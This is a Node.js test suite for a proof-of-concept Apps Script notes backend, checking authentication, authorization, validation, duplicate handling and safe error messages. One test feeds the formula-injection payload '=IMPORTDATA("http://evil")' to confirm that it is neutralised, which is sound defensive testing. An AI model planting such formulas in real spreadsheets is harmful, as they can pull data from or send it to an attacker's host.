/**
 * backend.test.js — proof-of-concept backend tests.
 * Run from the project folder with:  node --test tests/
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const { createBackend } = require('./gas-mocks');

const CLIENT_ID = 'test-client.apps.googleusercontent.com';
const future = () => Math.floor(Date.now() / 1000) + 3600;
const claims = (email, extra) => Object.assign({
  aud: CLIENT_ID, iss: 'https://accounts.google.com', exp: String(future()),
  email: email, email_verified: 'true'
}, extra || {});

const TOKENS = {
  'token-admin-aaaaaaaaaaaaaaaaaaaa': claims('Owner@Example.com'),
  'token-viewer-aaaaaaaaaaaaaaaaaaa': claims('viewer@example.com'),
  'token-inactive-aaaaaaaaaaaaaaaaa': claims('old@example.com'),
  'token-stranger-aaaaaaaaaaaaaaaaa': claims('stranger@example.com'),
  'token-wrongaud-aaaaaaaaaaaaaaaaa': claims('owner@example.com', { aud: 'someone-else' }),
  'token-wrongiss-aaaaaaaaaaaaaaaaa': claims('owner@example.com', { iss: 'evil.example.com' }),
  'token-expired-aaaaaaaaaaaaaaaaaa': claims('owner@example.com', { exp: '1000' }),
  'token-unverified-aaaaaaaaaaaaaaa': claims('owner@example.com', { email_verified: 'false' })
};
const ADMIN = 'token-admin-aaaaaaaaaaaaaaaaaaaa';
const VIEWER = 'token-viewer-aaaaaaaaaaaaaaaaaaa';

/** A backend that has been set up exactly as setupPocDatabase() does, plus extra users. */
function setupBackend() {
  const b = createBackend({ props: { GOOGLE_CLIENT_ID: CLIENT_ID }, tokens: TOKENS });
  b.sandbox.setupPocDatabase();
  b.sandbox.appendRecord_('tblUsers', { user_id: 'U900001', email: 'viewer@example.com', role: 'ANALYST', status: 'ACTIVE' });
  b.sandbox.appendRecord_('tblUsers', { user_id: 'U900002', email: 'old@example.com', role: 'ADMIN', status: 'INACTIVE' });
  return b;
}

const note = (text, requestId, token) => ({
  action: 'createNote', payload: { text: text }, id_token: token || ADMIN, request_id: requestId || 'req-0001-abcdef'
});

// ---------- Setup ----------
test('setup creates all tables, sequences and registers owner as ADMIN; re-running is safe', () => {
  const b = createBackend({ props: { GOOGLE_CLIENT_ID: CLIENT_ID }, tokens: TOKENS });
  b.sandbox.setupPocDatabase();
  b.sandbox.setupPocDatabase(); // second run must not duplicate anything
  const ss = b.state.spreadsheets[b.state.props.SPREADSHEET_ID];
  assert.deepEqual(Object.keys(ss._sheets).sort(), ['tblAuditLog', 'tblPocNotes', 'tblSequences', 'tblUsers']);
  assert.equal(b.rows('tblUsers').length, 1);
  assert.equal(b.rows('tblUsers')[0][1], 'owner@example.com');
  assert.equal(b.rows('tblUsers')[0][3], 'ADMIN');
  assert.equal(b.rows('tblSequences').length, 2);
});

// ---------- Basic requests ----------
test('ping works without sign-in', () => {
  const r = setupBackend().post({ action: 'ping' });
  assert.equal(r.success, true);
  assert.equal(r.message, 'pong');
});

test('doGet health check responds', () => {
  const out = setupBackend().sandbox.doGet();
  assert.equal(JSON.parse(out.getContent()).success, true);
});

test('invalid JSON, empty body, missing action, non-object payload and unknown action are rejected', () => {
  const b = setupBackend();
  assert.equal(b.post('{not json').error.code, 'BAD_REQUEST');
  assert.equal(b.post('').error.code, 'BAD_REQUEST');
  assert.equal(b.post({ payload: {} }).error.code, 'BAD_REQUEST');
  assert.equal(b.post({ action: 'ping', payload: [1] }).error.code, 'BAD_REQUEST');
  assert.equal(b.post({ action: 'deleteEverything' }).error.code, 'UNKNOWN_ACTION');
  assert.equal(b.post({ action: 'toString' }).error.code, 'UNKNOWN_ACTION');
});

test('oversized request is rejected', () => {
  const r = setupBackend().post({ action: 'ping', payload: { x: 'a'.repeat(200000) } });
  assert.equal(r.error.code, 'BAD_REQUEST');
});

// ---------- Authentication ----------
test('protected action without token → UNAUTHENTICATED', () => {
  assert.equal(setupBackend().post({ action: 'whoami' }).error.code, 'UNAUTHENTICATED');
});

test('token rejected by Google → UNAUTHENTICATED', () => {
  const r = setupBackend().post({ action: 'whoami', id_token: 'forged-token-aaaaaaaaaaaaaaaaaaa' });
  assert.equal(r.error.code, 'UNAUTHENTICATED');
});

for (const [label, token] of [
  ['wrong audience', 'token-wrongaud-aaaaaaaaaaaaaaaaa'],
  ['wrong issuer', 'token-wrongiss-aaaaaaaaaaaaaaaaa'],
  ['expired', 'token-expired-aaaaaaaaaaaaaaaaaa'],
  ['unverified email', 'token-unverified-aaaaaaaaaaaaaaa']
]) {
  test('token with ' + label + ' → UNAUTHENTICATED', () => {
    assert.equal(setupBackend().post({ action: 'whoami', id_token: token }).error.code, 'UNAUTHENTICATED');
  });
}

test('valid token, email matched case-insensitively → whoami returns role', () => {
  const r = setupBackend().post({ action: 'whoami', id_token: ADMIN });
  assert.equal(r.success, true);
  assert.equal(r.data.email, 'owner@example.com');
  assert.equal(r.data.role, 'ADMIN');
});

test('valid Google account not registered → FORBIDDEN', () => {
  const r = setupBackend().post({ action: 'whoami', id_token: 'token-stranger-aaaaaaaaaaaaaaaaa' });
  assert.equal(r.error.code, 'FORBIDDEN');
});

test('inactive user → FORBIDDEN', () => {
  const r = setupBackend().post({ action: 'whoami', id_token: 'token-inactive-aaaaaaaaaaaaaaaaa' });
  assert.equal(r.error.code, 'FORBIDDEN');
});

test('verified token is cached: second call does not contact Google again', () => {
  const b = setupBackend();
  b.post({ action: 'whoami', id_token: ADMIN });
  b.post({ action: 'whoami', id_token: ADMIN });
  assert.equal(b.state.fetchCount, 1);
});

// ---------- Authorization ----------
test('non-ADMIN cannot create a note, and nothing is written', () => {
  const b = setupBackend();
  const r = b.post(note('hello', 'req-viewer-0001', VIEWER));
  assert.equal(r.error.code, 'FORBIDDEN');
  assert.equal(b.rows('tblPocNotes').length, 0);
  assert.equal(b.rows('tblAuditLog').length, 0);
});

// ---------- Write path ----------
test('ADMIN creates a note: ID issued, row written, audit logged', () => {
  const b = setupBackend();
  const r = b.post(note('  First note  '));
  assert.equal(r.success, true);
  assert.equal(r.data.note_id, 'NOTE000001');
  assert.equal(r.data.duplicate, false);
  const rows = b.rows('tblPocNotes');
  assert.equal(rows.length, 1);
  assert.equal(rows[0][1], 'First note'); // trimmed
  assert.equal(rows[0][2], 'owner@example.com');
  const audit = b.rows('tblAuditLog');
  assert.equal(audit.length, 1);
  assert.deepEqual([audit[0][2], audit[0][4], audit[0][6]], ['CREATE', 'NOTE000001', 'SUCCESS']);
});

test('IDs are sequential and unique', () => {
  const b = setupBackend();
  const ids = ['req-a-000001', 'req-b-000002', 'req-c-000003'].map((id) => b.post(note('n', id)).data.note_id);
  assert.deepEqual(ids, ['NOTE000001', 'NOTE000002', 'NOTE000003']);
});

test('repeated submission with same request_id does not create a duplicate', () => {
  const b = setupBackend();
  const first = b.post(note('once', 'req-dup-123456'));
  const second = b.post(note('once', 'req-dup-123456'));
  assert.equal(second.success, true);
  assert.equal(second.data.duplicate, true);
  assert.equal(second.data.note_id, first.data.note_id);
  assert.equal(b.rows('tblPocNotes').length, 1);
  assert.equal(b.rows('tblAuditLog').length, 1);
});

test('validation: missing/blank/too-long text and bad request_id are rejected without writing', () => {
  const b = setupBackend();
  assert.equal(b.post(note('', 'req-v-000001')).error.code, 'VALIDATION_ERROR');
  assert.equal(b.post(note('   ', 'req-v-000002')).error.code, 'VALIDATION_ERROR');
  assert.equal(b.post({ action: 'createNote', payload: {}, id_token: ADMIN, request_id: 'req-v-000003' }).error.code, 'VALIDATION_ERROR');
  assert.equal(b.post(note(12345, 'req-v-000004')).error.code, 'VALIDATION_ERROR');
  assert.equal(b.post(note('x'.repeat(201), 'req-v-000005')).error.code, 'VALIDATION_ERROR');
  assert.equal(b.post(note('x'.repeat(200), 'req-v-000006')).success, true); // boundary: exactly 200 is OK
  assert.equal(b.post(note('ok', 'short')).error.code, 'VALIDATION_ERROR');
  assert.equal(b.post(note('ok', '12345678')).error.code, 'VALIDATION_ERROR'); // must start with a letter
  assert.equal(b.post({ action: 'createNote', payload: { text: 'ok' }, id_token: ADMIN }).error.code, 'VALIDATION_ERROR');
  assert.equal(b.rows('tblPocNotes').length, 1);
});

test('formula injection: text starting with = is stored as plain text, not a formula', () => {
  const b = setupBackend();
  const sheet = b.state.spreadsheets[b.state.props.SPREADSHEET_ID].getSheetByName('tblPocNotes');
  const original = sheet.appendRow;
  let rawWritten;
  sheet.appendRow = (arr) => { rawWritten = arr; original(arr); };
  b.post(note('=IMPORTDATA("http://evil")', 'req-f-000001'));
  assert.equal(rawWritten[1], "'=IMPORTDATA(\"http://evil\")");
});

test('lock busy → LOCK_TIMEOUT and nothing written', () => {
  const b = setupBackend();
  b.state.lockAvailable = false;
  assert.equal(b.post(note('x', 'req-l-000001')).error.code, 'LOCK_TIMEOUT');
  assert.equal(b.rows('tblPocNotes').length, 0);
});

// ---------- Read path ----------
test('listNotes returns saved notes (without internal request_id)', () => {
  const b = setupBackend();
  b.post(note('one', 'req-r-000001'));
  b.post(note('two', 'req-r-000002'));
  const r = b.post({ action: 'listNotes', id_token: VIEWER });
  assert.equal(r.success, true);
  assert.deepEqual(r.data.map((n) => n.text), ['one', 'two']);
  assert.equal('request_id' in r.data[0], false);
});

// ---------- Failure handling ----------
test('missing configuration → CONFIG_ERROR with safe message (no property name leaked)', () => {
  const b = createBackend({ tokens: TOKENS });
  const r = b.post({ action: 'whoami', id_token: ADMIN });
  assert.equal(r.error.code, 'CONFIG_ERROR');
  assert.doesNotMatch(r.error.message, /GOOGLE_CLIENT_ID/);
  assert.ok(b.state.logs.some(([lvl, m]) => lvl === 'error' && m.includes('GOOGLE_CLIENT_ID')));
});

test('unexpected internal error → INTERNAL_ERROR without stack trace', () => {
  const b = setupBackend();
  b.sandbox.SpreadsheetApp.openById = () => { throw new Error('secret internal detail at line 42'); };
  const r = b.post({ action: 'whoami', id_token: ADMIN });
  assert.equal(r.error.code, 'INTERNAL_ERROR');
  assert.doesNotMatch(JSON.stringify(r), /secret internal detail|line 42/);
});

test('every response has the standard shape', () => {
  const b = setupBackend();
  for (const r of [b.post({ action: 'ping' }), b.post('{bad'), b.post({ action: 'whoami' })]) {
    assert.deepEqual(Object.keys(r).sort(), ['data', 'error', 'message', 'success']);
  }
});
